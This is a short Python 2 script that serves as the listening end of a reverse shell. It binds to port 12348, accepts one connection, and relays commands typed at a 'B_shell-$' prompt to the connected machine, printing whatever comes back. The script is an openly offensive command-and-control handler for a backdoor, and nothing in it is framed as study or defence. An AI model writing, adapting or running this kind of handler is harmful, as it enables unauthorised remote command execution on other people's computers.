import socket
host = " "
port = 12348
serversocket = socket.socket()
serversocket.bind(('',port))
serversocket.listen(5)
clientsock, adress = serversocket.accept()
print(clientsock)
print(adress)
while 1:
        command_inject= str(raw_input("B_shell-$ : "))
        if command_inject=="exit":
                serversocket.close()
                print("Connection closed ! ")
                break
        com = str.encode(command_inject,"utf-8")
        clientsock.send(com)
        print(clientsock.recv(1024).decode("utf-8"))
serversocket.close()